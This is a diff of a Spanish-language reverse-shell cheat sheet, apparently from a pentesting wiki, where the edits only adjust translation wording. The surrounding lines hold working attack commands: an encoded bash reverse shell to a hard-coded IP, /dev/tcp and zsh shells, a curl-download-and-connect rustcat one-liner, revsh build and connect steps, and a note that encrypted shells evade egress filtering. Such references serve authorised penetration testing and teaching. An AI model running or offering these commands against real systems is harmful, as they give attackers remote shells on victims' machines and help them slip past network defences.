@@ -37,7 +37,7 @@ echo bm9odXAgYmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44LjQuMTg1LzQ0NDQgMD4mMSc
 1. **`bash -i`**: Esta parte del comando inicia una shell Bash interactiva (`-i`).
 2. **`>&`**: Esta parte del comando es una notación abreviada para **redirigir tanto la salida estándar** (`stdout`) como **el error estándar** (`stderr`) al **mismo destino**.
 3. **`/dev/tcp/<ATTACKER-IP>/<PORT>`**: Este es un archivo especial que **representa una conexión TCP a la dirección IP y puerto especificados**.
-- Al **redirigir las salidas y errores a este archivo**, el comando envía efectivamente la salida de la sesión de shell interactiva a la máquina del atacante.
+- Al **redirigir las salidas y flujos de error a este archivo**, el comando envía efectivamente la salida de la sesión de shell interactiva a la máquina del atacante.
 4. **`0>&1`**: Esta parte del comando **redirige la entrada estándar (`stdin`) al mismo destino que la salida estándar (`stdout`)**.
 
 ### Crear en archivo y ejecutar
@@ -226,7 +226,7 @@ zsh -c 'zmodload zsh/net/tcp; ztcp <ATTACKER-IP> <PORT>; zsh -i <&$REPLY >&$REPL
 ```
 ## Rustcat (rcat)
 
-[https://github.com/robiot/rustcat](https://github.com/robiot/rustcat) – listener moderno similar a netcat escrito en Rust (incluido en Kali desde 2024).
+[https://github.com/robiot/rustcat](https://github.com/robiot/rustcat) – oyente moderno similar a netcat escrito en Rust (empaquetado en Kali desde 2024).
 ```bash
 # Attacker – interactive TLS listener with history & tab-completion
 rcat listen -ib 55600
@@ -237,13 +237,13 @@ curl -L https://github.com/robiot/rustcat/releases/latest/download/rustcat-x86_6
 && /tmp/rcat connect -s /bin/bash <ATTACKER-IP> 55600
 ```
 Características:
-- Opción `--ssl` para transporte cifrado (TLS 1.3)
+- Opción de bandera `--ssl` para transporte encriptado (TLS 1.3)
 - `-s` para iniciar cualquier binario (por ejemplo, `/bin/sh`, `python3`) en la víctima
 - `--up` para actualizar automáticamente a un PTY completamente interactivo
 
-## revsh (cifrado y listo para pivotar)
+## revsh (encriptado y listo para pivotar)
 
-`revsh` es un pequeño cliente/servidor en C que proporciona un TTY completo a través de un **túnel Diffie-Hellman cifrado** y puede opcionalmente adjuntar una interfaz **TUN/TAP** para pivotar como un VPN inverso.
+`revsh` es un pequeño cliente/servidor en C que proporciona un TTY completo a través de un **túnel Diffie-Hellman encriptado** y puede opcionalmente adjuntar una interfaz **TUN/TAP** para pivotar como un VPN inverso.
 ```bash
 # Build (or grab a pre-compiled binary from the releases page)
 git clone https://github.com/emptymonkey/revsh && cd revsh && make
@@ -255,11 +255,11 @@ revsh -c 0.0.0.0:443 -key key.pem -cert cert.pem
 ./revsh <ATTACKER-IP>:443
 ```
 Banderas útiles:
-- `-b` : shell de enlace en lugar de reversa
+- `-b` : bind-shell en lugar de reverse
 - `-p socks5://127.0.0.1:9050` : proxy a través de TOR/HTTP/SOCKS
-- `-t` : crear una interfaz TUN (VPN reversa)
+- `-t` : crear una interfaz TUN (reverse VPN)
 
-Debido a que toda la sesión está cifrada y multiplexada, a menudo elude el filtrado de salida simple que mataría a un shell de texto plano `/dev/tcp`.
+Debido a que toda la sesión está cifrada y multiplexada, a menudo elude el filtrado de salida simple que mataría un shell de texto plano `/dev/tcp`.
 
 ## OpenSSL
 
@@ -347,7 +347,7 @@ Xnest :1
 ```
 ## Groovy
 
-by [frohoff](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76) NOTA: El reverse shell de Java también funciona para Groovy
+por [frohoff](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76) NOTA: El reverse shell de Java también funciona para Groovy
 ```bash
 String host="localhost";
 int port=8044;
